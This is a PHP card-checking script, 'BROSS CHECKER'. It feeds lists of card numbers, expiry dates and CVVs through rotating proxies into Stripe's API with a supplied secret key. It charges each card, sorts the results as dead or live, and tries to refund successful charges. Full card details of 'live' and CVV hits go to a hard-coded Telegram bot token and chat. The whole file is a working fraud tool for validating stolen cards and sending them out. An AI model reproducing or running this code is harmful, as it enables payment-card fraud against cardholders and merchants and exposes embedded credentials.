<?php
//===================== [ BROSS CHECKER ] ====================//
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
//================ [ FUNCTIONS & LISTA ] ===============//
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
function handleError() {
  // Do something to handle the error, such as logging it or displaying an error message to the user
  error_log('Error occurred while making the HTTP request');
}
////////////////////////////////////////////////////////////////////
  // Use proxy code here
$proxy = $_GET['proxy'];

function rebootproxys($retry = 0, $proxy) {
  if ($proxy == 'yes') {
    $proxySocks = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxySocks) - 1);
    $proxySocks = trim($proxySocks[$myproxy]); // remove any leading/trailing whitespace
    // check if proxy server is working
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $ip1 = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($http_code == 200 && !empty($ip1)) {
      return $ip1;
    } else {
      if ($retry < 10) {
        // Retry up to 3 times if the IP is not working
        return rebootproxys($retry + 1, $proxy);
      } else {
        return false;
      }
    }
  } else { //if proxy is not set to yes 
      return true;  //return false and continue the code 
  }
}

$retryCount = 0;
while ($retryCount < 10) {
  $proxyIP = rebootproxys($retryCount, $proxy);
  if ($proxyIP) { //if proxyIP is true 
    break; //break out of the loop 
  } else { //if proxyIP is false 
    $retryCount++; //increment the retry count 
  }
}

if ($retryCount == 10) { //if retry count is 10 
  echo "Failed to select a working proxy server after 10 retries. Exiting.\n"; //print out this message 
  exit(); //exit the code 
}
$proxyEcho = $proxyIP. "✅👍";
//////////////////////////////////////////////////////////////////////////////////////////////////
$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
    $amt = '1';
    $chr = $amt * 100;
}
$amtMap = array(
    '0.5' => '050',
    '0.6' => '060',
    '0.7' => '070',
    '0.8' => '080',
    '0.9' => '090',
    '1' => '100',
    '2' => '200',
    '3' => '300',
    '4' => '400',
    '5' => '500',
    '6' => '600',
    '7' => '700',
    '8' => '800',
    '9' => '900',
    '10' => '1000'
);
$amt = $amtMap[$amt] ?? '';
$sk = $_GET['skgate'];
$lista = $_GET['lista'];
$crn = $_GET['crn'];
if(empty($crn)) {
    $crn = 'usd';
}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
////////////////////////////////////////
// Set the chat ID and token
$chatID = -1001845357353;
$token = "5856648236:AAEBqiJuFjG-17019DLpRBRi3NozM4kyJnQ";

////////////=======[bin data]=======/////////////////////////////
$bin_limit_reached = false;
while (!$bin_limit_reached) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $response = curl_exec($ch); 
    /////echo "<br><b>Response: </b> $response<br>";
    curl_close($ch);
    $prepaid = GetStr($response, '"prepaid":', ',');
    $bank = GetStr($response, '"bank":{"name":"', '"');
    $country = GetStr($response, '"name":"', '"');
    $country2 = str_replace(" ", "-", strtolower(GetStr($response, '"name":"', '"')));
    $type = GetStr($response, '"type":"', '"');
    $Emoji = GetStr($response, '"emoji":"','"');
    $ci = " $bank ┃ $type ┃ $country ┃ $Emoji ┃ $prepaid ";
    ////echo $ci;
if (strpos($response, '"type":"')) {
            $bin_limit_reached = true;
            break;
        } else {
            $bin_limit_reached = false;
        }
    }
//================= [ CURL REQUESTS ] =================//
$rate_limit_reached = false;
$loop_count = 0;
while (!$rate_limit_reached) {
  //================= [ CURL REQUESTS ] =================//
#--------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36");
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$r1 = curl_exec($ch);
$tok1 = Getstr($r1,'"id": "','"');
$msg1 = Getstr($r1,'"message": "','"');
$para = Getstr($r1, ' "param": "','"');
$country1 = Getstr($r1, ' "country": "','"');
$type1 = Getstr($r1, ' "funding": "','"');
$resp1 = Getstr($r1,'"decline_code": "','"');
/////echo "<br><b>Result1: </b> $r1<br>";
///echo "<br><b>Result1[IP]: </b> $ip<br>";
  #-------------------[2nd REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36");
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amt.'&currency='.$crn.'&payment_method_types[]=card&payment_method='.$tok1.'&confirm=true&off_session=true&receipt_email=testrdp055@gmail.com');
$r2 = curl_exec($ch);
$chtoken = Getstr($r2,'"url": "/v1/charges/','/refunds"');
$riskl = Getstr($r2,'"risk_level": "','"');
$tok2 = Getstr($r2,'"id": "','"');
preg_match('/"risk_score": (\d+)/', $r2, $matches);
$risk_score = $matches[1];
$msg2 = Getstr($r2,'"seller_message": "','"');
if(empty($msg2)) {
    $msg2 = Getstr($r2,'"message": "','"');
}
$cvc = Getstr($r2,'"cvc_check": "','"');
$rule = Getstr($r2,'"rule": "','"');
$resp2 = Getstr($r2,'"decline_code": "','"');
$receipturl = trim(strip_tags(getStr($r2,'"receipt_url": "','"')));
////echo "<br><b>Result2: </b> $r2<br>";
//=================== [ RESPONSES ] ===================//
$ci1 = " $type1 ┃ $country1 ";
//////////================[DEAD]==============///
//////////================[DEAD]==============///
if (strpos($r1, '"rate_limit"') !== false || strpos($r2, '"rate_limit"') !== false || strpos($r2, '"fraudulent"') !== false || strpos($r2, '"processing_error"') !== false || strpos($r1, '"processing_error"') !== false || (strpos($r2, '"try_again_later"') !== false || strpos($r2, '"parameter_invalid_integer"') !== false || strpos($r3, '"rate_limit"' !== false))) {
    $loop_count++;
    $rate_limit_reached = false;
}
elseif (strpos($r2, '"amount_too_small"')) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD:`'.$lista.'`<br>amount_too_small</span><br>';
}
elseif (strpos($r1, '"card_not_supported"') || strpos($r1, '"invalid_expiry_year"') || strpos($r1, '"invalid_cvc"') || strpos($r1, '"invalid_expiry_month"') || strpos($r1, '"incorrect_number"') || strpos($r1, '"generic_decline"') || strpos($r1, '"parameter_invalid_integer"')) {
    $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>RESULT: #DEAD ❌ <br> ➔CARD:- `'.$lista.'` <br> ➔MASSAGE R1: '.$resp1.' ┃ '.$msg1.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br>';
  if (strpos($r1, '"risk_level":')) {
  echo '<span style="color:red">➔risk_level:'.$riskl.'</span><br>';
}
  if (strpos($r1, '"risk_score"')) {
  echo '<span style="color:red">➔risk_score: '.$risk_score.'</span><br>';
}
 if (strpos($r1, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:red">➔IP:'.$proxyEcho.'';
}
if (strpos($r1, '"cvc_check": "pass"') || strpos($r1, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc.'';
}
}
elseif (strpos($r1, '"testmode_charges_only"') || strpos($r1, '"api_key_expired"') || strpos($r1, 'Invalid API Key provided')){
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD:`'.$lista.'`<br>SK_INVALID</span><br>';
    break;
}
elseif (strpos($r1, 'more_permissions_required_for_application')) {
    echo '<span style="color:red">========================================<br>DEAD:`'.$lista.'`<br>SK_INVALID<br>['.$msg1.']</span><br>';
    $rate_limit_reached = true;
}
elseif (strpos($r2, '"invalid_account"') || strpos($r2, '"expired_card"') || strpos($r2, '"pickup_card"') || strpos($r2, '"incorrect_number"') || strpos($r2, '"lost_card"') || strpos($r2, '"generic_decline"') || strpos($r2, '"stolen_card"') || strpos($r2, '"card_not_supported"') || strpos($r2, '"card_decline_rate_limit_exceeded"')) {
    $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>RESULT: #DEAD ❌ <br> ➔CARD:- `'.$lista.'` <br> ➔MASSAGE R2: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br>';
    if (strpos($r2, '"risk_level":')) {
  echo '<span style="color:red">➔risk_level:'.$riskl.'</span><br>';
}
    if (strpos($r2, '"risk_score"')) {
  echo '<span style="color:red">➔risk_score: '.$risk_score.'</span><br>';
}
 if (strpos($r2, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:red">➔IP:'.$proxyEcho.'';
}
if (strpos($r2, '"cvc_check": "pass"') || strpos($r2, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc.'';
}
}
elseif (strpos($r2, ' "message": "Invalid currency:')) {
 $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>ERROR<br>['.$msg2.']</span><br>';
}
/////////////////=====[CCN]=====///////////////
elseif (strpos($r2,'"do_not_honor"') || strpos($r2,'"incorrect_cvc"') || strpos($r2, '"invalid_cvc"')) {
      $rate_limit_reached = true;
    $sendccn = true;
    echo '<span style="color:Aqua">========================================<br>RESULT: #CCN ❎ <br> ➔CARD:- `'.$lista.'` <br> ➔MASSAGE R2: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br> ';
    if (strpos($r2, '"risk_level":')) {
  echo '<span style="color:Aqua">➔risk_level:'.$riskl.'</span><br>';
}
    if (strpos($r2, '"risk_score"')) {
  echo '<span style="color:Aqua">➔risk_score: '.$risk_score.'</span><br>';
}
if (strpos($r2, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:Aqua">➔IP:'.$proxyEcho.'';
}
if (strpos($r2, '"cvc_check": "pass"') || strpos($r2, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc.'';
}
}
/////////////////=====[CVV]=====///////////////
elseif (strpos($r2,'"insufficient_funds"') || strpos($r2,'"authentication_required"') || strpos($r2,'"transaction_not_allowed"')){
  $rate_limit_reached = true;
    $sendcvv = true;
    echo '<span style="color:#66ff66">========================================<br>RESULT: #CVV ✔️ <br> ➔CARD:- `'.$lista.'`<br> ➔MASSAGE R2: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br> ';
    if (strpos($r2, '"risk_level":')) {
  echo '<span style="color:#66ff66">➔risk_level:'.$riskl.'</span><br>';
}
   if (strpos($r2, '"risk_score"')) {
  echo '<span style="color:#66ff66">➔risk_score: '.$risk_score.'</span><br>';
}
if (strpos($r2, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:#66ff66">➔IP:'.$proxyEcho.'';
}
if (strpos($r2, '"cvc_check": "pass"') || strpos($r2, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc.'';
}
}
/////////////////=====[LIVE]=====///////////////
elseif (strpos($r2,'"status": "succeeded"') !== false || strpos($r2,'"seller_message": "Payment complete."') !== false || strpos($r2,'"approved_by_network"') !== false){
    $rate_limit_reached = true;
    $sendlive = true;
    echo '<span style="color:Aqua">========================================<br>RESULT: #LIVE CHARGED ✅ <br> ➔CARD:- `'.$lista.'`<br> ➔MASSAGE R2: '.$resp2.' ┃ '.$msg2.'<br>{cvc_check:'.$cvc.'}<br>[Receipt :<a href='.$receipturl.'>Here</a>]<br> ➔BIN DATA: '.$ci.'<br> ➔BYPASSING: '.$loop_count.'</span><br> ';
    if (strpos($r2, '"risk_level":')) {
  echo '<span style="color:Aqua">➔risk_level:'.$riskl.'</span><br>';
}
    if (strpos($r2, '"risk_score"')) {
  echo '<span style="color:Aqua">➔risk_score= '.$risk_score.'</span><br>';
}
if (strpos($r2, "rule")) {
  echo '<span style="color:red">➔rule:'.$rule.'</span><br>';
}
if ($proxy == 'yes') {
  echo '<span style="color:Aqua">➔IP:'.$proxyEcho.'';
}
if (strpos($r2, '"cvc_check": "pass"') || strpos($r2, '"cvc_check": "faile"')) {
    echo '<span style="color:red">➔cvc_check:'.$cvc.'';
}
$max_retries = 20; // Maximum number of retries
$retries = 0; // Current number of retries
while ($retries < $max_retries) {
  // Make the HTTP request
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount='.$amt.'&reason=requested_by_customer');
  $r3 = curl_exec($ch);
  ///echo "<br><b>Result3: </b> $r3<br>";
  // Check if the request was successful
  if ($r3 !== false) {
    // Check if the refund was successful
    if (strpos($r3, '"status": "succeeded"') !== false) {
      // Refund was successful, exit the loop
      break;
    }
    // Check if the charge does not have a successful charge to refund
    if (strpos($r3, 'does not have a successful charge to refund.')) {  
      break; 
    }
  }
  // Request was not successful, increment the number of retries
  $retries++;
}
// Check if the request was successful after all retries
if ($r3 === false || strpos($r3, '"status": "succeeded"') === false) {
  // Request was not successful, handle the error
  handleError();
} else {
  // Request was successful, do something with the result
  echo '<span style="color:Aqua"> REFONDED= YES';
}
    
}
else{
        $rate_limit_reached = false;
        echo '<span style="color:Aqua">RESULT: #LIVE CHARGED: '.$lista.' <<'.$r1.'>><br><<'.$r2.'>><br><<'.$r3.'>></span><br>';
  }
}
  #-------------------[3rd REQ]--------------------#
$lista1 = `$lista`;
// Set the default message and the live message
$CCNMessage = urlencode("➔RESULT: #CCN ❎\nCARD:$lista1\n➔$resp2\n➔$msg2\n➔BIN DATA= $ci\n➔risk_level:$riskl\n➔cvc_check=$cvc");
$CCVMessage = urlencode("➔RESULT: #CVV ✔️\nCARD:$lista1\n➔$resp2\n➔$msg2\n➔BIN DATA= $ci\n➔risk_level:$riskl\n➔cvc_check=$cvc");
$LIVEMessage = urlencode("➔RESULT: #LIVE CHARGED✅\nCARD:$lista1\n➔$resp2\n➔$msg2\n➔BIN DATA= $ci\n➔risk_level:$riskl\n➔cvc_check=$cvc\n➔REFONDED= YES");
// Perform the request and get the result
$result = getResult();

  curl_close($ch);
  ob_flush();
// Check if the $sendlive variable is true
if ($sendcvv === true) {
    // Send the live message
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$CCVMessage";
    $response = file_get_contents($apiUrl);
}
elseif ($sendlive === true ) {
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$LIVEMessage";
    $response = file_get_contents($apiUrl);
}
elseif ($sendccn === true) {
    // Send the default message
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$CCNMessage";
    $response = file_get_contents($apiUrl);
}
// The getResult function
function getResult() {
    // Perform the request and return the result
    // Replace this with your actual code to get the result
    return "This is a test result";
}
//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";
?>